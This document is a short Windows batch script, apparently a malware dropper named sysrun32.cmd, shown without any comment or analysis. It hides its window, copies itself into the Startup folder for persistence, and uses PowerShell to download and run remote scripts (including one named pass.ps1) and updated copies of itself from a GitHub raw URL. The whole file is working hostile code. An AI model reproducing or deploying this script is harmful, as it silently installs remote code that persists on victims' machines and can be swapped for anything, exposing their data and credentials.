@echo off
set cver=1
set "startup=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
call :verify
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
copy %0 "%public%\sysrun32.cmd" & cls
copy %0 "%startup%sysrun32.cmd" & cls
if not exist "%public%\pass.ps1" (Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/baikil/randomcode/main/pass.ps1','%public%\pass.ps1')")
call :ros
if not "%1" == "" (goto :%1)
exit
:ros
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/baikil/randomcode/main/ros.cmd','%public%\ros.cmd')"
call ros.cmd
exit /b
:update
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/baikil/randomcode/main/sysrun32.cmd','%public%\sysrun32.cmd')"
start "" /min "%~dpnx0" %* && exit
exit /b
:verify
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/baikil/randomcode/main/version.txt','%public%\version.txt')"
set /p nver=<%public%\version.txt
if %cver% lss %nver% (goto :update)
exit /b